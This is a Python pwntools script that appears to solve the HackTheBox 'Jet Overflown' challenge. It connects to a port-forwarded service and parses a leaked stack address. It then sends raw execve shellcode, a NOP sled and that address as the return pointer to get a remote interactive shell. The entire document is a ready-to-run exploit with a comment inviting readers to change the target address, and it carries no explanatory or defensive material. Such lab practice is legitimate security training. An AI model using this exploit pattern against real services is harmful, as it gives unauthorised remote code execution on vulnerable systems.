# Buffer Overflow Exploit for HackTheBox Jet Overflown
# This exploit calls for a shell on port 60001
# !/usr/bin/python

from pwn import *

p = remote('240.0.0.1', 60001) # PORT FORWARDED ADDRESS using Ligolo-NG, change accordingly
p.recvuntil(b"Oops, I'm leaking! ")

leak = int(p.recvuntil(b"\n"), 16)
print(hex(leak))
p.recvuntil(b"> ")

# shellcode as bytes
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# build payload
buf = shellcode
buf += b"\x90" * (72 - len(shellcode))  # NOP sled
buf += p64(leak)                        

p.sendline(buf)
p.interactive()